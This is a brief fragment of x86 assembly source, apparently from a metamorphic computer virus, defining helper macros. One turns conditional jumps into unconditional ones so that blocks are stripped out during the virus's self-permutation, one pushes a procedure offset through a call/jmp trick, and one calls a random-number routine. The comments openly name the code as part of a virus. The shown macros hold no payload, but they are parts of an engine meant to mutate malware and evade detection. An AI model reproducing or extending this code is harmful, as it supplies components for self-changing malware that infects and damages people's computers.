
; jcc to 'skiplabel' will be replaced with JMP while "downgrade" action.
; after such replacement, skipping block becomes unused and will be removed
; while permutation.
;    ...code...
;    ...code...         ;
;    __skip:
downgrade               macro   skiplabel
                        clc
                        jc      skiplabel
                        ;...code...  ; this code will be removed from the
                        ;...code...  ; virus, when "downgrade" processed.
                        ; skiplabel:
                        endm

pusho                   macro   abc ; push offset of the procedure 'abc'
                        local   __t ; ***CANT BE USED TO GET REAL OFFSET***
                        call    __t
                        jmp     abc
                        __t:
                        endm

rnd                     macro   x   ; rnd(x), ZF if 0, ECX modified
                        push    x
                        call    my_rnd
                        pop     ecx
                        endm

